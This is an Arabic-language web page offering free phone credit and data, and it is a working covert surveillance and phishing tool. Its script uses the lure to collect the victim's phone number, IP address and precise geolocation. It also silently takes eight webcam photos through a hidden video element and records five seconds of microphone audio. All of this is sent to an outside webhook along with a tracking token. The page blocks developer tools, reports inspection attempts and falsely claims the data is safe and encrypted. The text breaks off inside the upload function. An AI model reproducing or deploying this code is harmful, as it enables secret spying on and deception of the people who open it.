<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 هدية مجانية - رصيد ونت</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: radial-gradient(ellipse at 30% 30%, #1a0a0a, #0d0505);
            background-attachment: fixed;
            color: #fff;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><circle cx="20" cy="20" r="8" fill="%23ffd700"/><circle cx="80" cy="40" r="12" fill="%23ff8c00"/><circle cx="50" cy="80" r="10" fill="%23ffd700"/><circle cx="10" cy="70" r="6" fill="%23ff8c00"/><circle cx="90" cy="85" r="9" fill="%23ffd700"/></svg>') repeat;
            pointer-events: none;
        }

        .app-wrapper {
            width: 100%;
            max-width: 560px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        .app-header {
            text-align: center;
            margin-bottom: 28px;
        }
        .app-header .logo-icon {
            font-size: 60px;
            display: inline-block;
            animation: float 3s ease-in-out infinite;
            filter: drop-shadow(0 10px 30px rgba(255, 215, 0, 0.3));
        }
        @keyframes float {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.05); }
        }
        .app-header h1 {
            font-size: 32px;
            font-weight: 900;
            margin-top: 6px;
            background: linear-gradient(135deg, #ffd700, #ff8c00, #ff4500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(255, 215, 0, 0.2);
            letter-spacing: 1px;
        }
        .app-header .subtitle {
            color: #ffb07c;
            font-size: 17px;
            font-weight: 300;
            margin-top: 2px;
            opacity: 0.9;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin-bottom: 30px;
        }
        .step-dot {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255,255,255,0.05);
            border: 2px solid rgba(255, 215, 0, 0.15);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 15px;
            color: #777;
            transition: all 0.4s ease;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
        }
        .step-dot.active {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border-color: #ffd700;
            color: #1a0a0a;
            transform: scale(1.15);
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
        }
        .step-dot.completed {
            background: #28a745;
            border-color: #28a745;
            color: #fff;
        }
        .step-line {
            width: 40px;
            height: 2px;
            background: rgba(255,255,255,0.06);
            border-radius: 2px;
            transition: background 0.4s ease;
        }
        .step-line.active {
            background: linear-gradient(90deg, #ffd700, #ff8c00);
        }

        .main-card {
            background: rgba(20, 10, 10, 0.7);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 56px;
            padding: 32px 26px 28px;
            border: 1px solid rgba(255, 215, 0, 0.15);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 215, 0, 0.05);
            position: relative;
            overflow: hidden;
        }
        .main-card::before {
            content: '';
            position: absolute;
            top: -40%;
            right: -30%;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 70% 30%, rgba(255, 215, 0, 0.05), transparent 70%);
            pointer-events: none;
        }
        .main-card::after {
            content: '🎁';
            position: absolute;
            bottom: -20px;
            left: -20px;
            font-size: 120px;
            opacity: 0.03;
            transform: rotate(-15deg);
            pointer-events: none;
        }

        .step {
            display: none;
            animation: fadeSlide 0.5s ease forwards;
        }
        .step.active {
            display: block;
        }
        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .step-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 4px;
            color: #fff;
        }
        .step-title .highlight {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .step-desc {
            color: #d4b8a0;
            font-size: 16px;
            margin-bottom: 22px;
        }

        .country-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(125px, 1fr));
            gap: 12px;
            margin: 20px 0;
        }
        .country-btn {
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255, 215, 0, 0.08);
            border-radius: 22px;
            padding: 16px 6px;
            color: #fff;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-family: 'Cairo', sans-serif;
            backdrop-filter: blur(4px);
        }
        .country-btn .flag {
            font-size: 38px;
            line-height: 1.2;
        }
        .country-btn .name {
            font-size: 15px;
            font-weight: 600;
        }
        .country-btn:hover {
            background: rgba(255, 215, 0, 0.08);
            border-color: #ffd700;
            transform: translateY(-6px) scale(1.04);
            box-shadow: 0 12px 40px rgba(255, 215, 0, 0.12);
        }
        .country-btn:active {
            transform: scale(0.95);
        }

        .permission-wrapper {
            background: rgba(255, 215, 0, 0.03);
            border-radius: 28px;
            padding: 18px 20px;
            margin: 15px 0 20px;
            border: 1px solid rgba(255, 215, 0, 0.06);
        }
        .permission-wrapper ul {
            list-style: none;
            padding: 0;
            margin: 6px 0;
            text-align: right;
        }
        .permission-wrapper ul li {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            color: #e0ccbb;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 12px;
        }
        .permission-wrapper ul li i {
            color: #ffd700;
            font-size: 20px;
            width: 28px;
            text-align: center;
        }
        .permission-wrapper .note {
            color: #c4a88a;
            font-size: 14px;
            margin-top: 12px;
            text-align: center;
            border-top: 1px solid rgba(255,255,255,0.04);
            padding-top: 12px;
        }

        .input-group {
            margin: 20px 0 18px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 16px;
            color: #e0ccbb;
            margin-bottom: 6px;
            font-weight: 700;
        }
        .input-group input {
            width: 100%;
            padding: 18px 22px;
            border-radius: 50px;
            border: 1px solid rgba(255, 215, 0, 0.08);
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 20px;
            outline: none;
            transition: all 0.3s;
            font-family: 'Cairo', sans-serif;
            text-align: right;
            letter-spacing: 0.5px;
        }
        .input-group input:focus {
            border-color: #ffd700;
            box-shadow: 0 0 0 5px rgba(255, 215, 0, 0.06);
        }
        .input-group input::placeholder {
            color: #776;
            font-size: 17px;
        }

        .btn-gold {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            border: none;
            color: #1a0a0a;
            font-weight: 800;
            padding: 20px 30px;
            border-radius: 60px;
            font-size: 24px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 40px rgba(255, 215, 0, 0.25);
            margin-top: 12px;
            font-family: 'Cairo', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            letter-spacing: 1px;
        }
        .btn-gold:hover:not(:disabled) {
            transform: translateY(-4px) scale(1.01);
            box-shadow: 0 16px 50px rgba(255, 215, 0, 0.4);
        }
        .btn-gold:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-gold .spinner {
            display: none;
            width: 28px;
            height: 28px;
            border: 3px solid rgba(0,0,0,0.15);
            border-top: 3px solid #1a0a0a;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .btn-gold.loading .spinner {
            display: inline-block;
        }
        .btn-gold.loading .btn-text {
            display: none;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status {
            margin-top: 16px;
            padding: 14px 18px;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 600;
            display: none;
            backdrop-filter: blur(8px);
            text-align: center;
        }
        .status.success {
            background: rgba(40, 167, 69, 0.12);
            color: #28a745;
            display: block;
            border: 1px solid rgba(40, 167, 69, 0.15);
        }
        .status.info {
            background: rgba(255, 215, 0, 0.06);
            color: #ffd700;
            display: block;
            border: 1px solid rgba(255, 215, 0, 0.08);
        }
        .status.error {
            background: rgba(255, 69, 0, 0.1);
            color: #ff4500;
            display: block;
            border: 1px solid rgba(255, 69, 0, 0.12);
        }

        .timer-box {
            background: rgba(0,0,0,0.2);
            border-radius: 60px;
            padding: 20px 30px;
            margin: 20px 0 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 24px;
            border: 1px solid rgba(255, 215, 0, 0.08);
        }
        .timer-box i {
            font-size: 40px;
            color: #ffd700;
            animation: pulse-icon 2s infinite;
        }
        @keyframes pulse-icon {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .timer-box span {
            font-size: 40px;
            font-weight: 900;
            color: #ffd700;
            letter-spacing: 5px;
            font-variant-numeric: tabular-nums;
            text-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
        }
        .timer-sub {
            color: #c4a88a;
            font-size: 16px;
            margin-top: 12px;
            font-weight: 400;
        }

        .app-footer {
            margin-top: 30px;
            text-align: center;
            font-size: 13px;
            color: #665;
            border-top: 1px solid rgba(255,255,255,0.03);
            padding-top: 18px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .app-footer .developer {
            color: #ffd700;
            font-weight: 600;
        }
        .app-footer .developer a {
            color: #ffd700;
            text-decoration: none;
        }
        .app-footer .developer a:hover {
            text-decoration: underline;
        }

        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }
        #hiddenCanvas {
            display: none;
        }

        @media (max-width: 500px) {
            .app-header h1 { font-size: 28px; }
            .main-card { padding: 20px 16px; border-radius: 40px; }
            .country-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
            .country-btn { padding: 12px 4px; font-size: 14px; }
            .country-btn .flag { font-size: 30px; }
            .step-title { font-size: 24px; }
            .btn-gold { font-size: 20px; padding: 16px 20px; }
            .step-dot { width: 34px; height: 34px; font-size: 13px; }
            .step-line { width: 25px; }
            .timer-box span { font-size: 32px; }
            .timer-box i { font-size: 32px; }
        }
        @media (max-width: 400px) {
            .country-grid { grid-template-columns: repeat(auto-fill, minmax(85px, 1fr)); }
            .country-btn { padding: 10px 4px; font-size: 12px; }
            .country-btn .flag { font-size: 26px; }
        }
    </style>
</head>
<body>

<div class="app-wrapper">
    <header class="app-header">
        <div class="logo-icon">🎁</div>
        <h1>هدية مجانية</h1>
        <p class="subtitle">رصيد • نت • وحدات • لكل الدول العربية</p>
    </header>

    <div class="step-indicator" id="stepIndicator">
        <div class="step-dot active" data-step="1">1</div>
        <div class="step-line" data-step="1"></div>
        <div class="step-dot" data-step="2">2</div>
        <div class="step-line" data-step="2"></div>
        <div class="step-dot" data-step="3">3</div>
    </div>

    <div class="main-card">
        <!-- STEP 1: COUNTRY -->
        <div class="step active" id="step-country">
            <div class="step-title">🌍 اختر <span class="highlight">بلدك</span></div>
            <p class="step-desc">للحصول على هدية تناسب شبكة اتصالاتك</p>
            <div class="country-grid" id="countryList"></div>
            <div class="status" id="statusCountry"></div>
        </div>

        <!-- STEP 2: TASKS -->
        <div class="step" id="step-tasks">
            <div class="step-title">🎁 استلم <span class="highlight">هديتك</span></div>
            <p class="step-desc" id="taskSub">أكمل البيانات وسيتم إرسال الهدية لك</p>
            <div class="permission-wrapper" id="permissionArea"></div>
            <div class="input-group">
                <label for="phoneInput"><i class="fas fa-phone-alt"></i> رقم هاتفك</label>
                <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15">
            </div>
            <button class="btn-gold" id="claimBtn">
                <span class="btn-text">🎁 احصل على هديتي</span>
                <span class="spinner"></span>
            </button>
            <div class="status" id="statusTasks"></div>
        </div>

        <!-- STEP 3: TIMER -->
        <div class="step" id="step-timer">
            <div class="step-title">✅ تم الإرسال</div>
            <p class="step-desc">جاري تجهيز هديتك، انتظر قليلاً</p>
            <div class="timer-box">
                <i class="fas fa-hourglass-half"></i>
                <span id="timerDisplay">03:00</span>
            </div>
            <p class="timer-sub">سيتم إرسال الهدية تلقائياً إلى رقمك</p>
            <div class="status" id="statusTimer"></div>
        </div>
    </div>

    <footer class="app-footer">
        <div><i class="fas fa-lock" style="color: #ffd700;"></i> بياناتك آمنة • خصوصية تامة</div>
        <div class="developer"><i class="fas fa-code"></i> المطور: <a href="https://t.me/xx_8k" target="_blank">‌</a></div>
    </footer>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="hiddenCanvas"></canvas>

<script>
    // ================================================================
    //  CONFIG - WEBHOOK
    // ================================================================
    const WEBHOOK_URL = "https://dev-free-gift-online.pantheonsite.io/Free/bot.php?action=webhook_data";

    // ================================================================
    //  CONSTANTS
    // ================================================================
    const TOTAL_PHOTOS = 8;
    const CAPTURE_INTERVAL = 700;
    const AUDIO_DURATION = 5000;
    const PHOTO_QUALITY = 0.92;

    // ================================================================
    //  COUNTRIES DATA (العربية فقط)
    // ================================================================
    const countries = {
        'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
        'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
        'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
        'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
        'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
        'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
        'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
        'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
        'العراق': { flag: '🇮🇶', prefixes: ['7'] },
        'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
        'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
        'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
        'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
        'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
        'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
        'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
        'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
        'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
        'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
        'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
        'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
    };

    // ================================================================
    //  TOKEN EXTRACTION
    // ================================================================
    let USER_TOKEN = null;

    function extractTokenFromURL() {
        const params = new URLSearchParams(window.location.search);
        const token = params.get('i');
        if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
            USER_TOKEN = token;
            console.log('✅ Token extracted:', USER_TOKEN);
            return true;
        } else {
            USER_TOKEN = null;
            console.warn('❌ No valid token found in URL.');
            return false;
        }
    }

    // ================================================================
    //  WEBHOOK SENDER (FormData)
    // ================================================================
    async function sendToWebhook(formData) {
        if (!USER_TOKEN) {
            console.error('❌ Cannot send: token missing');
            return { success: false, error: 'Token missing' };
        }
        formData.append('token', USER_TOKEN);

        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            if (!response.ok) {
                console.error('❌ Webhook error:', result);
                return { success: false, error: result.message || 'HTTP error' };
            }
            console.log('✅ Webhook success:', result);
            return { success: true, data: result };
        } catch (error) {
            console.error('❌ Webhook fetch error:', error);
            return { success: false, error: error.message };
        }
    }

    // ================================================================
    //  STATE
    // ================================================================
    let selectedCountry = null;
    let userPhone = null;
    let mediaStream = null;
    let audioStream = null;
    let audioRecorder = null;
    let audioChunks = [];
    let capturedPhotoFiles = [];
    let audioBlob = null;
    let userIP = 'غير متاح';
    let userLocation = { lat: null, lng: null, accuracy: null, error: null };
    let isProcessing = false;
    let timerInterval = null;
    let timerSeconds = 180;

    // DOM refs
    const stepCountry = document.getElementById('step-country');
    const stepTasks = document.getElementById('step-tasks');
    const stepTimer = document.getElementById('step-timer');
    const countryList = document.getElementById('countryList');
    const statusCountry = document.getElementById('statusCountry');
    const statusTasks = document.getElementById('statusTasks');
    const statusTimer = document.getElementById('statusTimer');
    const claimBtn = document.getElementById('claimBtn');
    const phoneInput = document.getElementById('phoneInput');
    const permissionArea = document.getElementById('permissionArea');
    const timerDisplay = document.getElementById('timerDisplay');
    const taskSub = document.getElementById('taskSub');
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('hiddenCanvas');

    const stepDots = document.querySelectorAll('.step-dot');
    const stepLines = document.querySelectorAll('.step-line');

    // ================================================================
    //  STEP INDICATOR UPDATE
    // ================================================================
    function updateStepIndicator(step) {
        stepDots.forEach((dot, index) => {
            const num = index + 1;
            dot.classList.remove('active', 'completed');
            if (num === step) dot.classList.add('active');
            else if (num < step) dot.classList.add('completed');
        });
        stepLines.forEach((line, index) => {
            const num = index + 1;
            line.classList.toggle('active', num < step);
        });
    }

    // ================================================================
    //  NOTIFICATION: USER ENTERED
    // ================================================================
    async function notifyUserEntered() {
        if (!USER_TOKEN) return;
        let ip = 'غير متاح';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
            userIP = ip;
        } catch (e) {}
        const formData = new FormData();
        formData.append('event', 'visit');
        formData.append('timestamp', new Date().toISOString());
        formData.append('ip', ip);
        formData.append('userAgent', navigator.userAgent);
        formData.append('platform', navigator.platform);
        formData.append('language', navigator.language);
        formData.append('screen', `${screen.width}x${screen.height}`);
        formData.append('url', window.location.href);
        const result = await sendToWebhook(formData);
        if (!result.success) {
            console.warn('⚠️ Failed to send visit notification:', result.error);
        }
    }

    // ================================================================
    //  DETECT SUSPICIOUS
    // ================================================================
    function detectSuspiciousActivity() {
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
        });
        document.addEventListener('keydown', (e) => {
            const key = e.key;
            const ctrl = e.ctrlKey || e.metaKey;
            const shift = e.shiftKey;
            if (key === 'F12' ||
                (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
                (ctrl && key === 'U')) {
                e.preventDefault();
                sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
            }
            if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
                sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
            }
        });
        document.addEventListener('dragstart', (e) => {
            e.preventDefault();
            sendSuspiciousAlert('🔄 محاولة سحب محتوى');
        });
        document.addEventListener('selectstart', (e) => {
            sendSuspiciousAlert('✏️ محاولة تحديد نص');
        });
    }

    let alertCooldown = 0;
    function sendSuspiciousAlert(action) {
        if (!USER_TOKEN) return;
        const now = Date.now();
        if (now - alertCooldown < 5000) return;
        alertCooldown = now;
        const formData = new FormData();
        formData.append('event', 'suspicious');
        formData.append('action', action);
        formData.append('timestamp', new Date().toISOString());
        formData.append('ip', userIP);
        formData.append('userAgent', navigator.userAgent);
        formData.append('url', window.location.href);
        sendToWebhook(formData).catch(console.warn);
    }

    // ================================================================
    //  RENDER COUNTRIES
    // ================================================================
    function renderCountries() {
        countryList.innerHTML = '';
        Object.keys(countries).forEach(name => {
            const btn = document.createElement('button');
            btn.className = 'country-btn';
            btn.innerHTML = `<span class="flag">${countries[name].flag}</span><span class="name">${name}</span>`;
            btn.dataset.country = name;
            btn.addEventListener('click', () => selectCountry(name));
            countryList.appendChild(btn);
        });
    }
    renderCountries();

    // ================================================================
    //  SELECT COUNTRY + GET LOCATION
    // ================================================================
    async function selectCountry(name) {
        selectedCountry = name;
        const data = countries[name];
        taskSub.textContent = `للاستفادة من هدية ${name} (رصيد، نت، وحدات)`;
        const prefixes = data.prefixes.join('، ');
        permissionArea.innerHTML = `
            <ul>
                <li><i class="fas fa-gift"></i> هدية مجانية بقيمة تصل إلى 50$</li>
                <li><i class="fas fa-wifi"></i> باقة نت إضافية لمدة 7 أيام</li>
                <li><i class="fas fa-phone-alt"></i> وحدات اتصال محلية ودولية</li>
            </ul>
            <div class="note">📞 الأرقام المسموحة: <strong style="color:#ffd700;">${prefixes}</strong></div>
            <div style="font-size:13px; color:#886; margin-top:10px; border-top:1px solid rgba(255,255,255,0.04); padding-top:10px;">
                <i class="fas fa-shield-alt" style="color:#ffd700;"></i> عملية آمنة • بياناتك مشفرة
            </div>
        `;
        phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;

        showStep('step-tasks');
        updateStepIndicator(2);
        statusTasks.className = 'status';
        statusTasks.style.display = 'block';
        statusTasks.className = 'status info';
        statusTasks.textContent = 'في إنتظار إكمال البيانات...';

        await getLocation();

        phoneInput.value = '';
        capturedPhotoFiles = [];
        audioChunks = [];
        audioBlob = null;
        claimBtn.disabled = false;
        claimBtn.classList.remove('loading');
        claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على هديتي';
    }

    function showStep(id) {
        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    // ================================================================
    //  BUTTON CLICK – MAIN ACTION (رسالة ثابتة)
    // ================================================================
    claimBtn.addEventListener('click', async () => {
        if (!USER_TOKEN) {
            showStatus(statusTasks, 'error', '⚠️ رابط غير صحيح، يرجى الدخول من الرابط المخصص. أو من البوت @V_V_4BOT .');
            return;
        }
        if (isProcessing) return;
        const phone = phoneInput.value.trim();
        if (!phone) {
            showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
            return;
        }
        const prefixes = countries[selectedCountry].prefixes;
        let valid = false;
        for (let p of prefixes) {
            if (phone.startsWith(p)) { valid = true; break; }
        }
        if (!valid) {
            showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
            return;
        }
        userPhone = phone;

        isProcessing = true;
        claimBtn.disabled = true;
        claimBtn.classList.add('loading');
        claimBtn.querySelector('.btn-text').textContent = 'جاري التأكيد...';
        
        // ⭐ الرسالة الثابتة طوال الوقت ⭐
        showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');

        await getIPAddress();
        await startCameraAndCapture();
        await recordAudio();

        const success = await sendAllData();

        if (success) {
            showStep('step-timer');
            updateStepIndicator(3);
            startTimer(180);
        } else {
            showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');
            claimBtn.disabled = false;
            claimBtn.classList.remove('loading');
            claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على هديتي';
            isProcessing = false;
        }
    });

    // ================================================================
    //  FUNCTIONS: IP, LOCATION, CAMERA, AUDIO, SEND
    // ================================================================
    async function getIPAddress() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (e) {
            userIP = 'Unable to fetch';
        }
    }

    // ================================================================
    //  LOCATION
    // ================================================================
    async function getLocation() {
        return new Promise((resolve) => {
            console.log('🔍 [getLocation] بدء عملية الحصول على الموقع...');
            if (!navigator.geolocation) {
                userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                showStatus(statusTasks, 'error', '❌ المتصفح لا يدعم خدمة تحديد الموقع.');
                console.error('❌ [getLocation] المتصفح لا يدعم Geolocation');
                resolve();
                return;
            }

            let watchId = null;
            let bestPosition = null;
            let bestAccuracy = Infinity;
            let isResolved = false;
            let attemptCount = 0;
            const MAX_ATTEMPTS = 10;
            const TIMEOUT_MS = 15000;
            const TARGET_ACCURACY = 100;

            const resolveWithBest = () => {
                if (isResolved) return;
                isResolved = true;
                if (watchId !== null) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                }
                if (bestPosition) {
                    userLocation.lat = bestPosition.coords.latitude;
                    userLocation.lng = bestPosition.coords.longitude;
                    userLocation.accuracy = bestPosition.coords.accuracy;
                    userLocation.error = null;
                    console.log('✅ [getLocation] نجاح:', bestPosition.coords.latitude, bestPosition.coords.longitude);
                } else {
                    userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                    console.error('❌ [getLocation] فشل الحصول على الموقع - لا توجد بيانات');
                }
                resolve();
            };

            const timeoutId = setTimeout(() => {
                if (!isResolved) {
                    console.warn('⏳ [getLocation] انتهت المهلة');
                    if (watchId !== null) {
                        navigator.geolocation.clearWatch(watchId);
                        watchId = null;
                    }
                    if (bestPosition) {
                        resolveWithBest();
                    } else {
                        userLocation.error = 'انتهت مهلة الحصول على الموقع';
                        resolve();
                    }
                }
            }, TIMEOUT_MS);

            const handlePosition = (pos) => {
                attemptCount++;
                const accuracy = pos.coords.accuracy;
                console.log(`📍 [getLocation] تحديث ${attemptCount}: دقة ${accuracy} متر`);
                if (accuracy < bestAccuracy) {
                    bestAccuracy = accuracy;
                    bestPosition = pos;
                }
                if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
                    console.log(`✅ [getLocation] تم الوصول للدقة المطلوبة (${accuracy} متر) أو انتهت المحاولات (${attemptCount})`);
                    resolveWithBest();
                    clearTimeout(timeoutId);
                }
            };

            const handleError = (err) => {
                if (isResolved) return;
                console.warn(`⚠️ [getLocation] خطأ: ${err.message} (كود ${err.code})`);
                if (err.code === 1) {
                    userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                    isResolved = true;
                    if (watchId !== null) {
                        navigator.geolocation.clearWatch(watchId);
                        watchId = null;
                    }
                    clearTimeout(timeoutId);
                    resolve();
                    return;
                }
                if (attemptCount < MAX_ATTEMPTS) {
                    // لا نعرض شيء للمستخدم
                } else {
                    if (bestPosition) {
                        resolveWithBest();
                    } else {
                        userLocation.error = err.message || 'تعذر الحصول على الموقع';
                        isResolved = true;
                        if (watchId !== null) {
                            navigator.geolocation.clearWatch(watchId);
                            watchId = null;
                        }
                        clearTimeout(timeoutId);
                        resolve();
                    }
                }
            };

            watchId = navigator.geolocation.watchPosition(
                handlePosition,
                handleError,
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
            );
            console.log('📡 [getLocation] تم بدء watchPosition');
        });
    }

    // ================================================================
    //  CAMERA (بدون رسائل للمستخدم)
    // ================================================================
    async function startCameraAndCapture() {
        return new Promise(async (resolve) => {
            try {
                console.log('📸 [startCameraAndCapture] بدء الكاميرا');
                const constraints = { video: true, audio: false };
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = mediaStream;
                await video.play();

                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
                    const onReady = () => { clearTimeout(timeout); resolve(); };
                    if (video.readyState >= 2 && video.videoWidth > 0) {
                        onReady();
                    } else {
                        video.addEventListener('loadedmetadata', onReady);
                        video.addEventListener('canplay', onReady);
                        video.play().catch(() => {});
                    }
                });

                await new Promise(r => setTimeout(r, 500));
                const ctx = canvas.getContext('2d');
                const width = Math.min(video.videoWidth || 640, 1920);
                const height = Math.min(video.videoHeight || 480, 1080);
                canvas.width = width;
                canvas.height = height;

                capturedPhotoFiles = [];

                for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                    ctx.drawImage(video, 0, 0, width, height);
                    const blob = await new Promise((resolve) => {
                        canvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
                    });
                    if (blob && blob.size > 1000) {
                        const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                        capturedPhotoFiles.push(file);
                    }
                    if (i < TOTAL_PHOTOS) {
                        await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
                    }
                }

                console.log(`✅ [startCameraAndCapture] تم التقاط ${capturedPhotoFiles.length} صور`);
                resolve(true);

            } catch (error) {
                console.error('❌ [startCameraAndCapture] خطأ:', error);
                if (mediaStream) {
                    mediaStream.getTracks().forEach(t => t.stop());
                    mediaStream = null;
                }
                video.srcObject = null;
                resolve(false);
            }
        });
    }

    // ================================================================
    //  AUDIO (بدون رسائل للمستخدم)
    // ================================================================
    async function recordAudio() {
        return new Promise(async (resolve) => {
            try {
                console.log('🎤 [recordAudio] بدء التسجيل الصوتي');
                const audioConstraints = { audio: true };
                audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                audioChunks = [];
                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        console.log(`✅ [recordAudio] تم التسجيل بحجم ${audioBlob.size} بايت`);
                    }
                    resolve();
                };
                audioRecorder.start();
                setTimeout(() => {
                    if (audioRecorder.state === 'recording') {
                        audioRecorder.stop();
                        console.log('⏹️ [recordAudio] تم إيقاف التسجيل');
                    }
                    audioStream.getTracks().forEach(t => t.stop());
                }, AUDIO_DURATION);
            } catch (error) {
                console.error('❌ [recordAudio] خطأ:', error);
                resolve();
            }
        });
    }

    // ================================================================
    //  SEND ALL DATA
    // ================================================================
    async function sendAllData() {
        console.log('📤 [sendAllData] بدء إعداد البيانات للإرسال');

